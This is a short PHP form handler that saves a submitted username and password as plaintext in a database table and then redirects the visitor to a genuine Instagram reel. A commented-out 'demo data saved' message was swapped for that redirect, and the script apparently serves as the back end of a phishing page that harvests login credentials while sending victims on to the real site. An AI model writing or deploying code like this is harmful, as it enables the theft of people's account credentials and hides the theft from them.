
<?php

require_once "db.php";

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    exit("Invalid request.");
}

$username = trim($_POST["username"] ?? "");
$password = trim($_POST["password"] ?? "");

if ($username === "" || $password === "") {
    exit("Please fill in all fields.");
}

$stmt = $conn->prepare(
    "INSERT INTO people (username, password) VALUES (?, ?)"
);

if (!$stmt) {
    exit("Unable to prepare the database query.");
}

$stmt->bind_param("ss", $username, $password);

// if ($stmt->execute()) {
//     echo "Demo data saved successfully.";
// } else {
//     echo "Unable to save demo data.";
// }
if ($stmt->execute()) {
    header("Location: https://www.instagram.com/reel/DDW8HcpyuE9/?exln=MTFrenFkcXA0ODJpcA==");
    exit();
} else {
    echo "Unable to save information.";
}

$stmt->close();
$conn->close();

?>
